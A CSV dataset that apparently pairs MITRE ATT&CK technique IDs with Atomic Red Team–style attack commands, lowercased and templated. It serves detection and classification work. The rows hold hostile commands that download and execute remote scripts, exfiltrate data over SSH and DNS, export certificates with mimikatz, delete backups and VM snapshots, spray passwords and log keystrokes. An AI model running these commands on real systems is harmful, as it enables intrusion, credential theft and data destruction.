mitre_id,command
T1112,cmd.exe /c reg add hklm\software\microsoft\windows\currentversion\policies\system /v localaccounttokenfilterpolicy /t reg_dword /d 1 /f cmd.exe /c reg add hklm\software\microsoft\windows\currentversion\policies\system /v enablelinkedconnections /t reg_dword /d 1 /f cmd.exe /c reg add hklm\system\currentcontrolset\control\filesystem /v longpathsenabled /t reg_dword /d 1 /f
T1007,get-childitem -path 'hklm:\system\currentcontrolset\services' | foreach-object { $p = get-itemproperty -path $_.pspath -erroraction silentlycontinue [pscustomobject]@{ name = $_.pschildname displayname = $p.displayname imagepath = $p.imagepath starttype = $p.start } } 
T1197,"set ""#{download_path}"" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventname:desktopimgdownldr"
T1134,"set-executionpolicy -scope process bypass -force $owners = @{} gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user} get-process | select processname,id,@{l=""owner"";e={$owners[$_.id.tostring()]}} & ""$pathtoatomicsfolder\t1134.002\src\gettoken.ps1""; [myprocess]::createprocessfromparent((get-process lsass).id,""cmd.exe"")   "
T1201,cat /etc/login.defs  
T1557,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/kevin-robertson/inveigh/82be2377ade47a4e325217b4144878a59595e750/inveigh.ps1"" -usebasicparsing) invoke-inveigh -consoleoutput y -nbns y -mdns y -https y -proxy y "
T1040,pktmon.exe filter add -p 445 
T1202,pcalua.exe -a #{process} pcalua.exe -a #{payload_path} # id_7700
T1197,bitsadmin.exe /create #{bits_job_name} bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file} bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} null bitsadmin.exe /resume #{bits_job_name} ping -n 5 127.0.0.1 >nul 2>&1 bitsadmin.exe /complete #{bits_job_name}  
T1484,"reg add ""hklm\software\policies\microsoft\windows\system"" /v grouppolicyrefreshtimedc /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v grouppolicyrefreshtimeoffsetdc /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v grouppolicyrefreshtime /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v grouppolicyrefreshtimeoffset /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v enablesmartscreen /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v shellsmartscreenlevel /t reg_sz /d block /f"
T1490,WBADMIN DELETE SYSTEMSTATEBACKUP -KEEPVERSIONS:0
T1057,get-wmiobject -class win32_process
T1115,"DIR | CLIP ECHO ""T1115"" > %TEMP%\T1115.TXT CLIP < %TEMP%\T1115.TXT"
T1001,"cd ""pathtoatomicsfolder\externalpayloads\"" import-module .\extract-invoke-psimage.ps1 $extractedscript=extract-invoke-psimage -image ""#{image_file}"" -out ""$home\result.ps1"" $scriptcontent = get-content ""$home\result.ps1"" -raw $base64pattern = ""(?<=^|[^a-za-z0-9+/])(?:[a-za-z0-9+/]{4})*(?:[a-za-z0-9+/]{2}(==)?|[a-za-z0-9+/]{3}=)?(?=$|[^a-za-z0-9+/])"" $base64strings = [regex]::matches($scriptcontent, $base64pattern) | foreach-object { $_.value } $base64strings | set-content ""$home\decoded.ps1"" $decodedcontent = get-content ""$home\decoded.ps1"" -raw $decodedtext = [system.text.encoding]::utf8.getstring([system.convert]::frombase64string($decodedcontent)) $textpattern = '^.+' $textmatches = [regex]::matches($decodedtext, $textpattern) | foreach-object { $_.value } $scriptpath = ""$home\textextraction.ps1"" $textmatches -join '' | set-content -path $scriptpath . ""$home\textextraction.ps1"" # id_9641"
T1651,"import-module ""pathtoatomicsfolder/t1651/src/t1651-1/awsssmattack.ps1"" -force $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $region = ""#{region}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") invoke-ssmattack -awsprofile ""t1651-1"" -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" invoke-terraform -terraformcommand destroy -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"")"
T1007,tasklist.exe /svc sc query sc query state= all  
T1552,MKDIR #{OUTPUT_FOLDER} FIND #{SEARCH_PATH} -TYPE D -NAME '.GNUPG' 2>/DEV/NULL -EXEC RSYNC -RR {} #{OUTPUT_FOLDER} \; EXIT 0
T1129,"#{pscp_file} -pw #{vm_pass} #{vib_file} #{vm_user}@#{vm_host}:/tmp echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{vib_install}"" "
T1652,lsmod
T1083,"echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{cli_script}"""
T1048,tar czpf - /users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /users.tar.gz.enc' # id_6576
T1496,yes > /dev/null
T1615,IEX(NEW-OBJECT NET.WEBCLIENT).DOWNLOADSTRING('HTTPS://RAW.GITHUBUSERCONTENT.COM/S3CUR3TH1SSH1T/WINPWN/121DCEE26A7ACA368821563CBE92B2B5638C5773/WINPWN.PS1') GPOAUDIT -NONINTERACTIVE -CONSOLEOUTPUT
T1652,"find /lib/modules/$(uname -r)/kernel/drivers -name ""*.ko*""  "
T1571,test-netconnection -computername #{domain} -port #{port}
T1482,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/recon/powerview.ps1' -usebasicparsing); get-domaintrust -verbose 
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""#{immutable_id}"" -pfxfilename ""#{certificate_path}"" -issuer ""#{issuer_uri}"" $conn = get-aadintaccesstokenforaadgraph -samltoken $saml -savetocache if ($conn) { write-host ""`nsuccessfully connected as $($conn.user)"" } else { write-host ""`nthe connection failed"" } write-host ""end of golden saml"" # id_7865"
T1217,"$username = (whoami).split('\')[1] $url_regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?' $history = get-content -path ""$env:systemdrive\users\$username\appdata\local\google\chrome\user data\default\history"" | select-string -allmatches $url_regex | foreach-object { $_.matches.value } | sort -unique $history | out-file -filepath ""$env:userprofile\downloads\chromebrowsinghistory.txt"""
T1056,"&""$pathtoatomicsfolder\t1056.001\src\get-keystrokes.ps1"" -logpath #{filepath}"
T1120,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') printercheck -noninteractive -consoleoutput
T1087,"""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" -sc exchaddresses #{optional_args} "
T1041,"$dnsserver = ""#{dns_server}"" $exfiltrateddata = ""#{exfiltrated_data}"" $chunksize = #{chunk_size} $encodeddata = [system.text.encoding]::utf8.getbytes($exfiltrateddata) $encodeddata = [convert]::tobase64string($encodeddata) $chunks = $encodeddata -split ""(.{$chunksize})"" foreach ($chunk in $chunks) { $dnsquery = $chunk + ""."" + $dnsserver resolve-dnsname -name $dnsquery start-sleep -seconds 5 } # id_3893"
T1648,"import-module ""pathtoatomicsfolder/t1648/src/t1648-1/lambdaattack.ps1"" -force $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $region = ""#{region}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder/t1648/src/t1648-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder/t1648/src/t1648-1"" -terraformvariables @(""profile=t1648-1"", ""region=$region"") invoke-lambdaattack -awsprofile ""t1648-1"" -awsregion $region   "
T1124,w32tm /stripchart /computer:localhost /period:5 /dataonly /samples:2  
T1010,"c:\windows\microsoft.net\framework\v4.0.30319\csc.exe -out:#{output_file_name} ""#{input_source_code}"" #{output_file_name} "
T1090,netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport} connectaddress=#{connectaddress}
T1543,sudo cp #{path_malicious_plist} /library/launchagents/#{plist_filename} launchctl load -w /library/launchagents/#{plist_filename}
T1083,ls -recurse get-childitem -recurse gci -recurse
T1201,pwpolicy getaccountpolicies
T1176,"# chromium $chromium = ""https://commondatastorage.googleapis.com/chromium-browser-snapshots/win_x64/1153778/chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https://github.com/ublockorigin/ubol-home/releases/download/ubolite_2024.11.25.1376/ubolite_2024.11.25.1376.chromium.mv3.zip"" set-location ""#{working_dir}"" set-variable progresspreference silentlycontinue invoke-webrequest -uri $chromium -outfile ""#{working_dir}\chrome.zip"" invoke-webrequest -uri $extension -outfile ""#{working_dir}\extension.zip"" expand-archive chrome.zip -destinationpath ""#{working_dir}"" -force expand-archive extension.zip -force start-process .\chrome-win\chrome.exe --load-extension=""#{working_dir}\extension\"" -passthru # id_5189"
T1531,SYSADMINCTL -DELETEUSER #{USER_ACCOUNT} #ENTER ADMIN PASSWORD
T1489,sudo pkill -sigterm #{process_pattern} 
T1005,"$startingdirectory = ""#{starting_directory}"" $outputzip = ""#{output_zip_folder_path}"" $fileextensionsstring = ""#{file_extensions}"" $fileextensions = $fileextensionsstring -split "", "" new-item -type directory $outputzip -erroraction ignore -force | out-null function search-files { param ( [string]$directory ) $files = get-childitem -path $directory -file -recurse | where-object { $fileextensions -contains $_.extension.tolower() } return $files } $foundfiles = search-files -directory $startingdirectory if ($foundfiles.count -gt 0) { $foundfilepaths = $foundfiles.fullname compress-archive -path $foundfilepaths -destinationpath ""$outputzip\data.zip"" write-host ""zip file created: $outputzip\data.zip"" } else { write-host ""no files found with the specified extensions."" } # id_9918"
T1040,SUDO #{PROGRAM_PATH} -4 -P -P 17 -T 3
T1570,net use * '#{remote_path}' /transport:quic /skipcertcheck copy '#{local_file}' '*:\' 
T1112,"reg delete ""hkey_current_user\software\microsoft\terminal server client\default"" /va /f reg delete ""hkey_current_user\software\microsoft\terminal server client\servers"" /f"
T1136,pw useradd #{username} -s /usr/sbin/nologin -d /nonexistent -c evil_account
T1133,"$extlist = #{extension_id} foreach ($extension in $extlist) { new-item -path hklm:\software\wow6432node\google\chrome\extensions\$extension -force new-itemproperty -path ""hklm:\software\wow6432node\google\chrome\extensions\$extension"" -name ""update_url"" -value ""https://clients2.google.com/service/update2/crx"" -propertytype ""string"" -force} start chrome start-sleep -seconds 30 stop-process -name ""chrome""   "
T1559,"""PATHTOATOMICSFOLDER\..\EXTERNALPAYLOADS\BUILD\NAMEDPIPES_EXECUTOR.EXE"" --PIPE 4"
T1518,"get-process | ?{$_.description -like ""*virus*""} get-process | ?{$_.description -like ""*carbonblack*""} get-process | ?{$_.description -like ""*defender*""} get-process | ?{$_.description -like ""*cylance*""} get-process | ?{$_.description -like ""*mc*""} get-process | ?{$_.processname -like ""*mc*""} get-process | where-object { $_.processname -eq ""sysmon"" }   "
T1562,"echo ""# this is a comment"" >> /etc/ufw/user.rules grep ""# this is a comment"" /etc/ufw/user.rules"
T1505,%windir%\system32\inetsrv\appcmd.exe install module /name:#{module_name} /image:#{dll_path} 
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestart /t reg_binary /d a273b6f07104d601 /f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestop /t reg_binary /d 96ef514b7204d601 /f
T1127,"#{msbuildpath}\#{msbuildname} ""#{filename}"" # id_9752"
T1098,"$x = get-random -minimum 2 -maximum 9999 $y = get-random -minimum 2 -maximum 9999 $z = get-random -minimum 2 -maximum 9999 $w = get-random -minimum 2 -maximum 9999 write-host haha_$x$y$z $fmm = get-localgroupmember -group administrators |?{ $_.objectclass -match ""user"" -and $_.principalsource -match ""local""} | select name foreach($member in $fmm) { if($member -like ""*administrator*"") { $account = $member.name.split(""\"")[-1] # strip computername\ $originaldescription = (get-localuser -name $account).description set-localuser -name $account -description ""atr:$account;$originaldescription"".substring(0,48) # keep original name in description rename-localuser -name $account -newname ""haha_$x$y$z"" # required due to length limitation write-host ""successfully renamed $account account on "" $env:computername } } # id_9829"
T1123,sh #{filename} #{audiofile} #{duration} # id_1348
T1222,chown -r #{owner}:#{group} #{file_or_folder}
T1485,"echo """" | ""#{plink_file}"" -batch ""#{vm_host}"" -ssh -l #{vm_user} -pw ""#{vm_pass}"" ""for i in `vim-cmd vmsvc/getallvms | awk 'nr>1 {print $1}'`; do vim-cmd vmsvc/snapshot.removeall $i & done"""
T1202,pcalua.exe -a #{process} pcalua.exe -a #{payload_path} # id_5864
T1610,docker build -t t1610 $pathtoatomicsfolder/t1610/src/ docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh   
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe /k tscon #{session_id} /dest:#{destination_id}"" net start sesshijack"
T1106,"c:\windows\microsoft.net\framework\v4.0.30319\csc.exe /out:""#{output_file}"" /target:exe ""#{source_file}"" %tmp%/t1106.exe   "
T1612,docker build -t t1612 $pathtoatomicsfolder/t1612/src/ docker run --name t1612_container --rm -d -t t1612 docker exec t1612_container ./test.sh
T1566,$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/t1566.001/bin/phishingattachment.xlsm' [net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 invoke-webrequest -uri $url -outfile $env:temp\phishingattachment.xlsm # id_2185
T1552,"""#{mimikatz_exe}"" ""crypto::certificates /systemstore:local_machine /store:my /export"" exit"
T1129,"#{pscp_file} -pw #{vm_pass} #{vib_file} #{vm_user}@#{vm_host}:/tmp echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{vib_install}"""
T1016,"$ports = get-content ""#{port_file}"" $file = ""#{output_file}"" $totalopen = 0 $totalports = 0 new-item $file -force foreach ($port in $ports) { $test = new-object system.net.sockets.tcpclient $wait = $test.beginconnect(""allports.exposed"", $port, $null, $null) $wait.asyncwaithandle.waitone(250, $false) | out-null $totalports++ | out-null if ($test.connected) { $result = ""$port open"" write-host -foregroundcolor green $result $result | out-file -encoding ascii -append $file $totalopen++ | out-null } else { $result = ""$port closed"" write-host -foregroundcolor red $result $totalclosed++ | out-null $result | out-file -encoding ascii -append $file } } $results = ""there were a total of $totalopen open ports out of $totalports ports tested."" $results | out-file -encoding ascii -append $file write-host $results # id_7997"
T1110,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') domainpassspray -consoleoutput -noninteractive -emptypasswords  
T1005,"cd $home curl -o #{remote_url}/art curl -o #{remote_url}/gta.db curl -o #{remote_url}/sqlite_dump.sh chmod +x sqlite_dump.sh find . ! -executable -exec bash -c 'if [[ ""$(head -c 15 {} | strings)"" == ""sqlite format 3"" ]]; then echo ""{}""; ./sqlite_dump.sh {}; fi' \;   "
T1115,ECHO IFCONFIG | PBCOPY $(PBPASTE)
T1129,"#{pscp_file} -pw #{vm_pass} #{vib_file} #{vm_user}@#{vm_host}:/tmp echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{vib_install}"" # id_5192"
T1648,"import-module ""pathtoatomicsfolder/t1648/src/t1648-1/lambdaattack.ps1"" -force $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $region = ""#{region}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder/t1648/src/t1648-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder/t1648/src/t1648-1"" -terraformvariables @(""profile=t1648-1"", ""region=$region"") invoke-lambdaattack -awsprofile ""t1648-1"" -awsregion $region"
T1572,"set-location ""pathtoatomicsfolder"" .\t1572\src\t1572-doh-beacon.ps1 -dohserver #{doh_server} -domain #{domain} -subdomain #{subdomain} -querytype #{query_type} -c2interval #{c2_interval} -c2jitter #{c2_jitter} -runtime #{runtime} # id_6170"
T1216,set comspec=#{command_to_execute} cscript %windir%\system32\manage-bde.wsf 
T1010,"c:\windows\microsoft.net\framework\v4.0.30319\csc.exe -out:#{output_file_name} ""#{input_source_code}"" #{output_file_name}"
T1221,"start ""#{docx_file}""  "
T1543,if [ ! -d ~/library/launchagents ]; then mkdir ~/library/launchagents; fi; sudo cp #{path_malicious_plist} ~/library/launchagents/#{plist_filename} sudo launchctl load -w ~/library/launchagents/#{plist_filename}
T1021,"[activator]::createinstance([type]::gettypefromprogid(""mmc20.application"",""#{computer_name}"")).document.activeview.executeshellcommand(""c:\windows\system32\calc.exe"", $null, $null, ""7"")  "
T1528,"az login # log in to azure cli $allowsharedkeyaccess = az storage account show --name ""#{storage_account_name}"" --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { # download file for cleanup $tmporiginalfilename = [system.io.path]::getfilename(""#{file_path}"") $tmporiginalfunctioncode = join-path $env:temp/ (""t1528_tmp_original_"" + $tmporiginalfilename) az storage file download --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --only-show-errors --dest $tmporiginalfunctioncode if ($lastexitcode -eq 0) { # upload new funciton code if download of existing code succeeded if (""#{execution_option}"" -eq ""insert_code"") { # download file from file share for injection $tmpfunctioncode = join-path $env:temp/ (""t1528_tmp_to_inject_"" + $tmporiginalfilename) az storage file download --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --only-show-errors --dest $tmpfunctioncode if ($lastexitcode -ne 0) { write-output ""function code download failed."" exit 1 } write-output ""file downloaded: $($tmpfunctioncode)"" $insertcontent = get-content -path ""#{code_to_insert_path}"" -raw # load the content of the insert file $content = get-content -path $tmpfunctioncode -raw # inject code to file $content = $insertcontent + ""`n"" + $content # insert the new code at the beginning $content | set-content -path $tmpfunctioncode # write the modified content to the file # upload file to file share az storage file upload --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --source $tmpfunctioncode --only-show-errors if ($lastexitcode -ne 0) { write-output ""function code upload failed."" exit 1 } write-output ""uploaded the tampered file"" } elseif (""#{execution_option}"" -eq ""replace_file"") { az storage file upload --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --source ""#{code_to_insert_path}"" --only-show-errors if ($lastexitcode -ne 0) { write-output ""function code upload failed."" exit 1 } write-output ""uploaded the tampered file"" } else { write-output ""please choose a valid execution_option"" exit 1 } } else { write-output ""download original function code failed."" exit 1 } } # id_6718"
